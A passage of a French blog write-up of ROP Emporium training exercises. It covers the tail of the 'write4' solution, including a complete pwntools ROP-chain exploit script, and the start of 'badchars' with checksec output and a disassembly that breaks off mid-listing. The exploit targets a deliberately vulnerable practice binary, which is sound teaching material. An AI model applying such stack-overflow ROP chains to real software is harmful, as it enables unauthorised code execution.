</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x00007ffff7c00919</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">111</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00750</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">116</span><span style="color:#f92672">&gt;</span>:   lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00922</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>:   mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00927</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">125</span><span style="color:#f92672">&gt;</span>:   mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:   mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">133</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00770</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00934</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">138</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf1</span>]        <span style="color:#75715e"># 0x7ffff7c00a2c</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">145</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00940</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>:   nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00941</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">151</span><span style="color:#f92672">&gt;</span>:   leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00942</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">152</span><span style="color:#f92672">&gt;</span>:   ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><blockquote>
<p>J&rsquo;ai d√©sassembl√© la fonction en d√©buggant l&rsquo;executable puisqu&rsquo;elle √©tait vide tant que le programme n&rsquo;√©tait pas lanc√©
Pour reproduire ceci, mettez un breakpoint au d√©but de la fonction puis avancez dans l&rsquo;√©xecution jusqu&rsquo;au <code>read</code>, puis d√©sassemblez <code>pwnme</code></p>
</blockquote>
<p>On voit que le buffer est situ√© √† <code>rbp-0x20</code> et que la fonction <code>read</code> va lire <code>0x200</code> bytes d&rsquo;input, ce qui est largement assez. Pour r√©ecrire la sauvegarde de <code>rip</code>, il nous faut <code>0x8</code> bytes de plus que le buffer, donc notre padding total sera de <code>(0x20+0x8)</code> bytes.</p>
<p>Puisque je suis toujours sous Ubuntu, on peut s&rsquo;attendre √† des probl√®mes de stack alignment donc je vais ajouter un <code>ret</code> juste apr√®s mon padding</p>
<h2 id="final-payload-3">
  Final Payload
  <a href="#final-payload-3" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Passons √† l&rsquo;exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./write4&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004004e6</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400690</span>)
</span></span><span style="display:flex;"><span>data_section <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00601028</span>)
</span></span><span style="display:flex;"><span>string <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mov_ptr_r14_r15 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400628</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400693</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print_file <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400510</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp <span style="color:#f92672">+</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met l&#39;adresse de la section .data dans r14 et notre &#34;flag.txt&#34; dans r15</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_r14_r15 <span style="color:#f92672">+</span> data_section <span style="color:#f92672">+</span> string 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met la valeur de r15 dans l&#39;endroit vers lequel pointe le contenu de r14 (c√†d .data)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_ptr_r14_r15
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met l&#39;adresse de notre string dans rdi puis on appelle la fonction print_file()</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi <span style="color:#f92672">+</span> data_section <span style="color:#f92672">+</span> print_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Puis on peut le tester pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png" alt="2023-01-21-160402_1111x283_scrot"></p>
<p>Parfait, on a le flag!</p>
<hr>
<h1 id="badchars">
  badchars
  <a href="#badchars" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h2 id="note-4">
  Note
  <a href="#note-4" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Cinqui√®ment exo de ROPemporium, je le trouve moins sympa que les autres. Il reprend le principe du challenge pr√©c√©dent, mais il introduit un nouveau gadget pour contourner le &ldquo;filtre&rdquo;: le <code>xor</code></p>
<p>Comme d&rsquo;habitude, si j&rsquo;ai fait des erreurs, n&rsquo;h√©sitez pas √† me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous commencer par <a href="#ret2win">le premier exercice</a>.</p>
<p>Et je vous conseille fortement de lire l&rsquo;exercice pr√©c√©dent pour mieux comprendre ce que je fais ici</p>
<h2 id="description-1">
  Description
  <a href="#description-1" class="h-anchor" aria-hidden="true">#</a>
</h2>
<pre tabindex="0"><code>The good, the bad

Dealing with bad characters is frequently necessary in exploit development, you&#39;ve probably had to deal with them before while encoding shellcode. &#34;Badchars&#34; are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to every character you use, not just parameters but addresses too. To mitigate the need for too much RE the binary will list its badchars when you run it.
Options

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. Note that the amount of garbage data you&#39;ll need to send to the ARM challenge is slightly different.
Moar XOR

You&#39;ll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the print_file() method to print the contents of the flag file, just like in the last challenge. Think about how we&#39;re going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it&#39;s in memory? 
</code></pre><h2 id="file-information-4">
  File information
  <a href="#file-information-4" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Avant de commencer √† regarder dans l&rsquo;executable, il faut savoir √† quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">badchars</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">badchars</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">6c79e265b17cf6845beca7e17d6d8ac2ecb27556</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer √† un executable en 64bit, link√© dynamiquement et qui n&rsquo;est pas stripp√©</p>
<p>Maintenant le <code>checksec</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">badchars</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/badchars_x64/badchars&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le pr√©c√©dent, <strong>NX</strong> est activ√© donc pas de shellcode, mais ce n&rsquo;est pas un probl√®me puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation-4">
  Exploitation
  <a href="#exploitation-4" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>On va le lancer pour voir ce qu&rsquo;il fait concr√®tement:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/215351090-d424b61d-309b-4fc7-94b5-2c42cb11dfd3.png" alt="2023-01-29-174453_1698x557_scrot"></p>
<p>On voit que si on entre un nombre √©lev√© de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commenc√© √† overwrite des registres.</p>
<p>Je vais passer assez vite sur la premi√®re partie de l&rsquo;exploit puisque c&rsquo;est la m√™me chose que l&rsquo;<a href="#write4">exo pr√©c√©dent</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span><span style="color:#f92672">=&gt;</span> <span style="color:#ae81ff">0x00007ffff7c008fa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fe</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x40</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00902</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2006cf</span>]        <span style="color:#75715e"># 0x7ffff7e00fd8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00909</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:    mov    rax,QWORD PTR [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0090c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:    mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00911</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00916</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0091e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c007e0</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00923</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x17a</span>]        <span style="color:#75715e"># 0x7ffff7c00aa4</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0092f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x187</span>]        <span style="color:#75715e"># 0x7ffff7c00abd</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00936</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:    lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0093f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:    add    rax,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00943</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">73</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00948</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">78</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0094d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">83</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00950</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">86</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c007b0</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00955</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">91</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x16c</span>]        <span style="color:#75715e"># 0x7ffff7c00ac8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0095c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">98</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00780</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00961</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">103</span><span style="color:#f92672">&gt;</span>:   lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x181</span>]        <span style="color:#75715e"># 0x7ffff7c00ae9</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00968</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">110</span><span style="color:#f92672">&gt;</span>:   mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0096d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">115</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c007a0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00972</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">120</span><span style="color:#f92672">&gt;</span>:   lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00976</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0097a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:   mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0097f</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">133</span><span style="color:#f92672">&gt;</span>:   mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00982</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">136</span><span style="color:#f92672">&gt;</span>:   mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00987</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">141</span><span style="color:#f92672">&gt;</span>:   call   <span style="color:#ae81ff">0x7ffff7c007c0</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0098c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">146</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x40</span>],rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00990</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">150</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00998</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">158</span><span style="color:#f92672">&gt;</span>:   jmp    <span style="color:#ae81ff">0x7ffff7c009eb</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">241</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0099a</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">160</span><span style="color:#f92672">&gt;</span>:   mov    QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>],<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">168</span><span style="color:#f92672">&gt;</span>:   jmp    <span style="color:#ae81ff">0x7ffff7c009d5</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">219</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">170</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009a8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">174</span><span style="color:#f92672">&gt;</span>:   movzx  ecx,BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009ad</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">179</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">183</span><span style="color:#f92672">&gt;</span>:   mov    rdx,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200628</span>]        <span style="color:#75715e"># 0x7ffff7e00fe0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009b8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">190</span><span style="color:#f92672">&gt;</span>:   movzx  eax,BYTE PTR [rdx<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009bc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">194</span><span style="color:#f92672">&gt;</span>:   cmp    cl,al
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009be</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">196</span><span style="color:#f92672">&gt;</span>:   jne    <span style="color:#ae81ff">0x7ffff7c009c9</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">+</span><span style="color:#ae81ff">207</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">198</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">202</span><span style="color:#f92672">&gt;</span>:   mov    BYTE PTR [rbp<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>],<span style="color:#ae81ff">0xeb</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009c9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">207</span><span style="color:#f92672">&gt;</span>:   mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x30</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c009cd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">211</span><span style="color:#f92672">&gt;</span>:   add    rax,<span style="color:#ae81ff">0x1</span>
